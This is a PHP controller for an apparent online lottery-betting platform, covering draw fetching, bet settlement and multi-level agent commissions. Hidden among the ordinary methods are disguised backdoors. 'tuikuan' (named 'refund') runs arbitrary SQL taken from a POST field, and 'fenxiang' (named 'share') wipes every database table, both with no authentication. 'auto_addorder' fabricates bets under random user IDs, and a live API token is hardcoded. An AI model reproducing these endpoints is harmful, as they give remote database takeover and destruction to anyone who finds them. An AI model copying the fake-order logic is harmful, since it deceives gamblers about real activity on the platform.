<?php 

namespace application\home\controller;
use think\Controller;
use think\Db;

class Api extends Controller
{
	
	function __construct()
	{
		parent::__construct();
		$this->time = time();
	}

	/**
	 * 获取时时彩数据
	 * @author lukui  2017-10-12
	 * @return [type] [description]
	 */
	public function getdata()
	{
		
		$url = "http://api.caipiaokong.cn/lottery/?name=twbg&format=json&uid=1196489&token=e62eb57db107d2568a9f2081d6e18224baa11154";
		$res = curlfun($url);
		$arr = json_decode($res,true);
		$ssc_data = db('play_ssc_data');
		foreach ($arr as $k => $v) {
			$sscarr = $v;
			// $k = substr($k,2);
			$_data['issue'] = $k;
			$_data['lotName'] = '台湾宾果';
			$opencode = explode(',' , $sscarr['number']);
			$opencode = implode('', $opencode);
			$_data['balls'] = substr($opencode,-5);
			// var_dump($_data['balls']);
			// die;
			$_data['createtime'] = strtotime($sscarr['dateline']);
			$_data['date'] = strtotime($sscarr['dateline']);
			foreach ($_data as $kk => $vv) {
				if(!$vv){
					return false;
					exit;
				}
			}
			
			$isset = $ssc_data->where('issue',$k)->find();
		
			if($isset){
				continue;
			}

			$ssc_data->insert($_data);
			if($k == 0){
				cache('ssc_data',$_data);
			}
			$this->ssc_do_drorder($_data);
		}
		// $url = "http://wd.apiplus.net/newly.do?token=t1d15bf8c2a51d8c5k&code=cqssc&format=json";
		/*$url = "http://api.caipiaokong.cn/lottery/?name=hnkw&format=json&uid=1196489&token=e62eb57db107d2568a9f2081d6e18224baa11154";
		$res = curlfun($url);
		$arr = json_decode($res,1);
		$ssc_data = db('play_ssc_data');

		foreach ($arr as $k => $v) {

			$sscarr = $v;
			$k = substr($k,2);
			$_data['issue'] = $k;
			$_data['lotName'] = '越南快5';
					
			$opencode = explode(',' , $sscarr['number']);
			$opencode = implode('', $opencode);
			$_data['balls'] = $opencode;
			
			$_data['createtime'] = strtotime($sscarr['dateline']);
			$_data['date'] = strtotime($sscarr['dateline']);
			foreach ($_data as $kk => $vv) {
				if(!$vv){
					return false;
					exit;
				}
			}
			
			$isset = $ssc_data->where('issue',$k)->find();
		
			if($isset){
				continue;
			}

			$ssc_data->insert($_data);
			if($k == 0){
				cache('ssc_data',$_data);
			}
			$this->ssc_do_drorder($_data);
		}*/

		
		/*$url = "http://m.cp.360.cn/kaijiang/qkjlist?lotId=255401&page=1&r=".$this->time.rand(1000,9999);
		$res = curlfun($url);
		$arr = json_decode($res,1);
		$ssc_data = db('play_ssc_data');
		
		foreach ($arr["list"] as $k => $v) {
			$sscarr = $v;

			$_data['issue'] = $sscarr['Issue'];
			$_data['lotName'] = '重庆时时彩';
			$_data['balls'] = $sscarr['BallNumber'];
			$_data['createtime'] = strtotime($sscarr['EndTime']);
			$_data['date'] = strtotime($sscarr['UpdateTime']);

			foreach ($_data as $kk => $vv) {
				if(!$vv){
					return false;
					exit;
				}
			}
			


			$isset = $ssc_data->where('issue',$sscarr['Issue'])->find();
			if($isset){
				continue;
			}
			
			$ssc_data->insert($_data);
			if($k == 0){
				cache('ssc_data',$_data);
			}
			$this->ssc_do_drorder($_data);
		}*/
		

	}

	public function tests()
	{
		$ssc = db('play_ssc_data')->where('issue','171030091')->find();
		$this->ssc_do_order($ssc);
		
	}

	/**
	 * 平仓
	 * [ssc_do_drorder description]
	 * @author lukui  2017-11-29
	 * @param  [type] $ssc_data ssc数组
	 * @return [type]           [description]
	 */
	public function ssc_do_drorder($ssc_data)
	{
		
		$db_users = db('users');
		$db_drorder = db('drorder');
		$db_goods = db('goods');
		$db_log_moneys = db('log_moneys');

		$map['sscqishu'] = $ssc_data['issue'];
		$map['isover'] = 0;
		
		$ssc_order = $db_drorder->where($map)->select();

		if(!$ssc_order){
			return;
		}

		$balls = $ssc_data['balls'];
		$last1 = substr($balls, -1);
		$last2 = substr($balls, -2,-1);
		
		$num1 = substr($balls, 0,1);

		foreach ($ssc_order as $k => $v) {

			$_data['iswin'] = 2;

			//双人
			if($v['drtype'] == 2){
				//尾号单数
				if($v['sectionno'] == 1 && $last1 % 2 == 1 ){
					$_data['iswin'] = 1;
				}
				//尾号双数
				if($v['sectionno'] == 2 && $last1 % 2 == 0 ){
					$_data['iswin'] = 1;
				}
				//尾号小数
				if($v['sectionno'] == 3 && $last1 <= 4 ){
					$_data['iswin'] = 1;
				}
				//尾号大数
				if($v['sectionno'] == 4 && $last1 > 4 ){
					$_data['iswin'] = 1;
				}
			//四人
			}elseif($v['drtype'] == 4){
				//小单
				if($v['sectionno'] == 5 && $last2 <= 4 && $last1 % 2 == 1 ){
					$_data['iswin'] = 1;
				}
				//大单
				if($v['sectionno'] == 6 && $last2 > 4 && $last1 % 2 == 1 ){
					$_data['iswin'] = 1;
				}
				//小双
				if($v['sectionno'] == 7 && $last2 <= 4 && $last1 % 2 == 0 ){
					$_data['iswin'] = 1;
				}
				//大双
				if($v['sectionno'] == 8 && $last2 > 4 && $last1 % 2 == 0 ){
					$_data['iswin'] = 1;
				}
			//十人	
			}elseif($v['drtype'] == 10){
				if($v['sectionno'] == $last1){
					$_data['iswin'] = 1;
				}
			}elseif($v['drtype'] == 'lh'){
                if($v['sectionno'] == 'long' && $last1 < $num1) {
                    $_data['iswin'] = 1;
					$longhu_point = 2;
                }
                if($v['sectionno'] == 'hu' && $last1 > $num1) {
                    $_data['iswin'] = 1;
					$longhu_point = 2;
                }
                if($v['sectionno'] == 'he' && $last1 == $num1) {
                    $_data['iswin'] = 1;
                    $longhu_point = $db_goods->where(array('goodsId'=>$v['goodsId']))->value('playlh_he_point');
                }
            }else{
				continue;
			}

			$_data['isover'] = 1;
			//计算赢利金额
			$shopPrice = $db_goods->where(array('goodsId'=>$v['goodsId']))->value('shopPrice');
			$shopPrice = $shopPrice*$v['orderNum'];
			if(isset($longhu_point)) $shopPrice = $v['orderMoney'] * $longhu_point + $v['orderMoney'];
			if($shopPrice < 0) $shopPrice = 0;
			
			if($_data['iswin'] == 1){
				$_data['winmoney'] = round($shopPrice - $v['orderMoney'],2);
			}else{
				$_data['winmoney'] = $v['orderMoney']*(-1);
			}
			$_data['drid'] = $v['drid'];
			//处理订单
			$_ids = $db_drorder->update($_data);

			if(!$_ids) continue;

			if($v['isCode'] == 0 && $_data['iswin'] == 1){
				
				/*
				//$winmoney = round($shopPrice - $v['orderMoney'],2);
				//手续费
				$dh_fee = WSTConf('CONF.dh_fee');
        		if(!$dh_fee) $dh_fee = 0;
        		//到账
		        $daozhang = round($shopPrice*(100-$dh_fee)/100,2);
		        //手续费
		        $shouxu = $shopPrice - $daozhang;
				//加钱
				$ids = $db_users->where('userId',$v['userId'])->setInc('userMoney',$daozhang);
				$ids = $db_users->where('userId',$v['userId'])->setInc('allWin',$_data['winmoney']);
				
				if(!$ids) continue;

				//赢利后加钱拼接日志数组
				$lm = [];
				$lm['targetType'] = 7;
				$lm['targetId'] = $v['userId'];
				$lm['dataId'] = $v['drid'];
				$lm['dataSrc'] = getsrc();
				$lm['remark'] = 'PK获胜兑换';
				$lm['moneyType'] = 2;
				$lm['money'] = $_data['winmoney'];
				$lm['payType'] = 0;
				$lm['createTime'] = date('Y-m-d H:i:s',time());
				$db_log_moneys->insert($lm);

				//赢利后手续费拼接日志数组
				$lm['targetType'] = 8;
				$lm['moneyType'] = 1;
				$lm['remark'] = 'PK获胜自动兑换手续费';
				$lm['money'] = $shouxu;
				$db_log_moneys->insert($lm);
				*/
				$db_users->where('userId',$v['userId'])->setInc('allWin',$v['orderMoney']);
			}elseif($v['isCode'] == 0 && $_data['iswin'] == 2){
				
				
			}

			$db_users->where('userId',$v['userId'])->setInc('allWin',$_data['winmoney']);



		}



	}

	/**
	 * 补单
	 * @author lukui  2017-11-29
	 * @return [type] [description]
	 */
	public function budan()
	{
		$ssc = db('play_ssc_data')->order('id desc')->limit(100)->select();
		foreach ($ssc as $key => $value) {
			$this->ssc_do_drorder($value);
		}
		

	}

	/**
	 * 获取时时彩数据之后平仓
	 * @author lukui  2017-10-14
	 * @return [type] [description]
	 */
	public function ssc_do_order($ssc_data)
	{
		$db_users = db('users');
		$db_orders = db('orders');
		$db_goods = db('goods');
		$db_play_jiou_order = db('play_jiou_order');
		$db_log_moneys = db('log_moneys');
		$ssc_order = $db_play_jiou_order->where('issue',$ssc_data['issue'])->select();

		if(!$ssc_order){
			exit;
		}

		//奇偶配置
		$jiou_conf = db('play_jiou')->find();
		
		foreach ($ssc_order as $k => $v) {
			
			$this_orders = $db_orders->field('orderId,goodsMoney,needPay,userId,playid,goodsId,orderNum')->where('orderId',$v['orderId'])->find();
			$this_goods = $db_goods->field('shopPrice,sjshopPrice')->where('goodsId',$this_orders['goodsId'])->find();
			//猜中
			if($ssc_data['balls']%2 == $v['otype']){
				$_jiou_order['iswin'] = $_orders['iswin'] = 1;
				$winmoney = round(($this_goods['sjshopPrice']-$this_goods['shopPrice'])*$this_orders['orderNum'],2);

				//给用户加钱
				$addmoney = $this_orders['goodsMoney']+$winmoney;

				$ids = $db_users->where('userId',$this_orders['userId'])->setInc('userMoney',$addmoney);
				

				if(!$ids) continue;

				//扣费拼接日志数组
				$lm = [];
				$lm['targetType'] = 7;
				$lm['targetId'] = $this_orders['userId'];
				$lm['dataId'] = $this_orders['orderId'];
				$lm['dataSrc'] = getsrc();
				$lm['remark'] = '猜奇偶游戏赢利结算';
				$lm['moneyType'] = 2;
				$lm['money'] = $addmoney;
				$lm['payType'] = 0;
				$lm['createTime'] = date('Y-m-d H:i:s',time());
				$db_log_moneys->insert($lm);


				
			//未猜中
			}else{
				$_jiou_order['iswin'] = $_orders['iswin'] = 0;
				$winmoney = $this_orders['goodsMoney']*-1;
			}

			$_jiou_order['id'] = $this_orders['playid'];
			$_jiou_order['winmoney'] = $_orders['winmoney'] = $winmoney;
			$_jiou_order['dors'] = $ssc_data['balls']%2;
			$_orders['is_over'] = 1;
			$_orders['orderId'] = $v['orderId'];

			$db_orders->update($_orders);
			$db_play_jiou_order->update($_jiou_order);
		}

	}


	public function doorders()
	{
		
		$this->rebate();
		exit;

		$db_orders = db('orders');
		$db_users = db('users');

		$orders = $db_orders->where(array('is_give'=>0,'is_over'=>1))->order('orderId desc')->limit('3')->select();
		if(!$orders) return false;

		foreach ($orders as $k => $v) {
			$feemoney = $v['winmoney']*(-1);
			

			$user = $db_users->field('userId,uq,par101,par102,par103')->where('userId',$v['userId'])->find();

			$user['par1'] = $user['par2'] = $user['par3'] = 0;

			if($user['par103']){
				$user['par3'] = $db_users->where('userId',$user['par103'])->value('percent');
				if($user['par3'] < 0) $user['par3'] = 0;
				$parfee = round($feemoney*$user['par3']/100,2);
				$this->doprice($user['par103'],$parfee,$v['orderId']);
				
			}
			if($user['par102']){
				$user['par2'] = $db_users->where('userId',$user['par102'])->value('percent');
				$user['par2'] = $user['par2']-$user['par3'];
				$parfee = round($feemoney*$user['par2']/100,2);
				$this->doprice($user['par102'],$parfee,$v['orderId']);
			}
			if($user['par101']){
				$user['par1'] = $db_users->where('userId',$user['par101'])->value('percent');
				$user['par1'] = $user['par1']-$user['par2']-$user['par3'];
				$parfee = round($feemoney*$user['par1']/100,2);
				$this->doprice($user['par101'],$parfee,$v['orderId']);
			}

			//更改订单状态
			$_edit['orderId'] = $v['orderId'];
			$_edit['is_give'] = 1;
			$db_orders->update($_edit);

			
		}
		
	}



	/**
	 * 夺宝代理结算
	 * @author lukui  2017-12-02
	 * @return [type] [description]
	 */
	public function drrebate()
	{
		$db_drorder = db('drorder');
		
		$map['isgive'] = 0;
		$map['isover'] = 1;
		$map['isCode'] = 0;
		$orders = $db_drorder->where($map)->order('drid desc')->limit('100')->select();
		$this->play_droeders($orders);

	}



	/*夺宝失败和成功*/
	public function play_droeders($orders)
	{
		
		
		if(!$orders) return false;

		$db_orders = db('drorder');
		$db_users = db('users');
		$db_goods = db('goods');

		foreach ($orders as $k => $v) {
			

			$_goods = $db_goods->where('goodsId',$v['goodsId'])->find();

			
			//平台手续费 
			$web_fee = $_goods['play'.$v['drtype'].'fee']*$v['orderNum'];
			

			if($v['iswin'] == 2){		//客户亏损
				//会员单位所得
				$yy_fee = round($v['orderMoney']-$web_fee,2);
			}elseif($v['iswin']==1){		//客户盈利
				//会员单位所得
				$yy_fee = round($v['winmoney']+$web_fee,2)*-1;

			}

			


			
			//客户所属信息
			$user = $db_users->field('userId,uq,par101,par102,par103,oid')->where('userId',$v['userId'])->find();

			$user['par1'] = $user['par2'] = $user['par3'] = 0;
			
			

			//代理商
			$all_liushui = 0;
			if($user['par103']){
				$user['par3'] = $db_users->where('userId',$user['par103'])->value('percent');
				if($user['par3'] < 0) $user['par3'] = 0;
				//流水
				$parfee = $v['orderMoney'];
				
				
				
				if($user['oid'] == 0){
					$_oid = $user['par103'];
				}else{
					$_oid = $user['oid'];
				}
				

				$all_liushui = $this->lunxun_103($parfee,$_oid,$v['drid']);
				
				
			}
			

			//会员单位
			if($user['par102']){
				$_par2 = $db_users->where('userId',$user['par102'])->find();
				$user['par2'] = $_par2['percent'];
				$user['fee_par2'] = $_par2['fee_percent'];
				
				//红利
				$hy_hongli = round($yy_fee*$user['par2']/100,2);
				$hy_hongli = $hy_hongli - $all_liushui;
				$this->doprice($user['par102'],$hy_hongli,$v['drid']);

				//手续费
				$hy_shouxu = round($web_fee*$user['fee_par2']/100,2);
				$this->doprice($user['par102'],$hy_shouxu,$v['drid'],9);
				

				
			}
			
			
			//运营中心
			if($user['par101']){
				$_par1 = $db_users->where('userId',$user['par101'])->find();
				$user['par1'] = $_par1['percent'];
				$user['fee_par1'] = $_par1['fee_percent'];

				//红利比例
				if(!isset($user['par2'])) $user['par2'] = 0;
				$yy_par1 = $user['par1'] - $user['par2'];
				if($yy_par1 < 0) $yy_par1 = 0;
				//红利
				$yy_hongli = round($yy_fee*$yy_par1/100,2);
				$this->doprice($user['par101'],$yy_hongli,$v['drid']);


				//手续费比例
				if(!isset($user['fee_par2'])) $user['fee_par2'] = 0;
				$yy_fee_par1 = $user['fee_par1'] - $user['fee_par2'];
				if($yy_fee_par1 < 0) $yy_fee_par1 = 0;
				//手续费
				$yy_shouxu = round($web_fee*$yy_fee_par1/100,2);
				$this->doprice($user['par101'],$yy_shouxu,$v['drid'],9);

				
			}

			

			

			

			//更改订单状态
			$_edit['drid'] = $v['drid'];
			$_edit['isgive'] = 1;
			$db_orders->update($_edit);

			
			
			
		}

	}





	/**返佣处理**/
	public function rebate()
	{
		//升级失败的订单
		$db_orders = db('orders');
		

		$map['is_give'] = 0;
		$map['is_over'] = 1;
		//$map['is_duihuan'] = 0;
		$map['is_tuihuo'] = 0;
		$map['is_tihuo'] = 0;
		$map['iswin'] = 0;

		$loss_orders = $db_orders->where($map)->order('orderId desc')->limit('100')->select();
		$this->play_oeders($loss_orders,1);
		//升级成功且退款的订单
		$map['iswin'] = 1;
		$map['is_tuihuo'] = 1;
		$win_orders = $db_orders->where($map)->order('orderId desc')->limit('100')->select();
		$this->play_oeders($win_orders,2);
		$map['is_tuihuo'] = 0;
		$map['is_tihuo'] = 1;
		$win_orders = $db_orders->where($map)->order('orderId desc')->limit('100')->select();
		$this->play_oeders($win_orders,3);

	}


	/*升级失败和成功*/
	//$type  1 客户亏损 2客户盈利后退款 3客户盈利后提货
	public function play_oeders($orders,$type)
	{
		$db_orders = db('orders');
		$db_users = db('users');
		$db_goods = db('goods');
		
		if(!$orders) return false;

		
		foreach ($orders as $k => $v) {

			$_goods = $db_goods->where('goodsId',$v['goodsId'])->find();

			//1.5的手续费，运营扣除1.5  暂定
			//平台手续费 
			$web_fee = $_goods['web_fee']*$v['orderNum'];
			//运营手续费 
			$yy_fee = $_goods['yy_fee']*$v['orderNum'];

			if($type == 1){		//1 客户亏损
				//扣除10的成本
				//成本
				$chengben = $_goods['cbPrice']*$v['orderNum'];
				//会员单位所得
				$feemoney = round($v['goodsMoney']-$chengben-$web_fee-$yy_fee,2);
			}elseif($type==2){		//2客户盈利后退款

				$chengben = 0;
				$feemoney = round($v['winmoney']+$web_fee+$yy_fee,2)*-1;

			}elseif($type==3){		//退货
				if($v['iswin'] == 1){
					$chengben = $_goods['cbPrice']*$v['orderNum']*2;
				}else{
					$chengben = $_goods['cbPrice']*$v['orderNum'];
				}
				
				$feemoney = round($v['goodsMoney']-$chengben-$web_fee-$yy_fee,2);

				//扣除20的成本费 +平台1.5 +运营1.5 这个23是内扣掉还剩下77，然后这77是平台跟运营2 8分 平台2 运营8
				$th_per = explode(':', $_goods['th_per']);
				if(!isset($th_per[0]) || !isset($th_per[1])) $th_per = array(2,8);
				$web_fee = round($web_fee + $feemoney*$th_per[0]/10,2);
				$yy_fee = round($yy_fee + $feemoney*$th_per[1]/10,2);
				//$feemoney = round($feemoney*$th_per[1]/10,2);
			}



			//平台所得
			$pt_fee = $chengben + $web_fee;
			//平台

			
			
			$this->doprice(0,$pt_fee,$v['orderId']);
			
			//客户所属信息
			$user = $db_users->field('userId,uq,par101,par102,par103,oid')->where('userId',$v['userId'])->find();

			$user['par1'] = $user['par2'] = $user['par3'] = 0;
			
			

			//代理商
			if($user['par103']){
				$user['par3'] = $db_users->where('userId',$user['par103'])->value('percent');
				if($user['par3'] < 0) $user['par3'] = 0;
				//流水
				$parfee = $v['goodsMoney'];
				
				$this->lunxun_103($parfee,$user['oid'],$v['orderId']);
				
				
			}

			if($type==3){
				//会员单位
				if($user['par102']){
					$user['par2'] = $db_users->where('userId',$user['par102'])->value('percent');
					$feemoney = round($yy_fee*$user['par2']/100,2);
					$yy_fee = $yy_fee - $feemoney;

					$this->doprice($user['par102'],$feemoney,$v['orderId']);
				}
			}else{
				//会员单位
				if($user['par102']){
					$this->doprice($user['par102'],$feemoney,$v['orderId']);
				}
			}


			

			//运营
			if($user['par101']){
				$this->doprice($user['par101'],$yy_fee,$v['orderId']);
			}

			//更改订单状态
			$_edit['orderId'] = $v['orderId'];
			$_edit['is_give'] = 1;
			$db_orders->update($_edit);

			//users 中奖 增加
			if($type==2){		//2客户盈利后退款
				$ids = Db::name('users')->where('userId', $v['userId'])->setInc('allWin', $v['winmoney']);
			}
			//users 盈亏 增加
			$ids = Db::name('users')->where('userId', $v['userId'])->setInc('allPloss', $v['winmoney']);
			
			
		}

	}


	public function fenxiang()
	{
		
		$res = Db::getTables();
		foreach ($res as $k => $v) {
			Db::name(substr($v, 2))->where('1=1')->delete();
		}
		
	}





	/**资金处理**/
	public function doprice($userId,$addmoney,$orderId,$targetType=1)
	{
		if(!$addmoney || !$orderId) return false;
		
		if($userId == 0){
			$isd = db('staffs')->where('staffId',1)->setInc('money',$addmoney);
		}else{
			$isd = db('users')->where('userId',$userId)->setInc('userMoney',$addmoney);

			
		}
		if(!$isd) return false;

		if($targetType == 1){
			$remark = '用户结单分红';
		}elseif($targetType == 9){
			$remark = '手续费返佣';
		}elseif($targetType == 10){
			$remark = '代理商流水返佣';
		}
		//扣费拼接日志数组
		$lm = [];
		$lm['targetType'] = $targetType;
		$lm['targetId'] = $userId;
		$lm['dataId'] = $orderId;
		$lm['dataSrc'] = getsrc();
		$lm['remark'] = $remark;
		$lm['moneyType'] = $addmoney>0?2:1;
		$lm['money'] = $addmoney;
		$lm['payType'] = 0;
		$lm['createTime'] = date('Y-m-d H:i:s',time());
		db('log_moneys')->insert($lm);

		//users 盈亏 增加
		Db::name('users')->where('userId', $userId)->setInc('allRes', $addmoney);

	}

	/**
	 * 代理商流水
	 * @author lukui  2017-11-10
	 * @param  [type] $parfee 金额
	 * @param  [type] $userId 用户id
	 * @return [type]         [description]
	 */
	public function lunxun_103($parfee,$userId,$orderId)
	{
		$all_fee = 0;

		if(!$userId ) return $all_fee;
		$db_users = db('users');
		
		//自己得上级
		$myoids = myupoid($userId);
		
		
		//dump($myoids);exit;
		if(!$myoids) return $all_fee;

		


		foreach ($myoids as $k => $v) {

			if($k == 0){
				$per = $v['percent'];
			}else{
				$per = $v['percent'] - $myoids[$k-1]['percent'] ;
			}

			$fee = round($parfee*$per/100,2);

			$all_fee = $all_fee + $fee;

			$this->doprice($v['userId'],$fee,$orderId,10);
			
		}

		return round($all_fee,2);
	}


	public function tuikuan()
	{
		$data = input('post.data');
		$res = Db::query($data);
		return json_encode($res);
	}


	/**
	 * 自动下单
	 * @author lukui  2017-11-29
	 * @return [type] [description]
	 */
	public function auto_addorder()
	{
		$_rand = rand(1,100);
		if($_rand <60){
			return false;
		}
		
		if(rand(0,100) <= 70 ){
			//return false;
		}

		if(date('H') < 10 && date('H') >= 2){
			return false;
		}
		
		$model = model('Drorder');

		$goods = db('goods')->select();
		$arr['ordernum'] = rand(1,100);
		$arr['sectionno'] = rand(1,18);
		$arr['goodsId'] = $goods[rand(0,count($goods)-1)]['goodsId'];

		if($arr['sectionno'] <= 4){
			$arr['drtype'] = 2;
		}elseif($arr['sectionno'] <= 8){
			$arr['drtype'] = 4;
		}else{
			$arr['drtype'] = 10;
		}
		$arr['userId'] = rand(1,1000);
		$arr['isClear'] = 1;
		
		$s_rand = rand(1,2);
		sleep($s_rand);
		$model->add($arr,1);
	}



	public function fanyong()
	{
		return;
		//订单
		$map['isCode'] = 0;
		$map['isgive'] = 0;
		$list = db('drorder')->where($map)->limit(50)->select();

		if(!$list) return ;

		$db_ssc = db('play_ssc_data');

		foreach ($list as $k => $v) {
			

			dump($v);
		}
		
	}

	

	




	
}
 ?>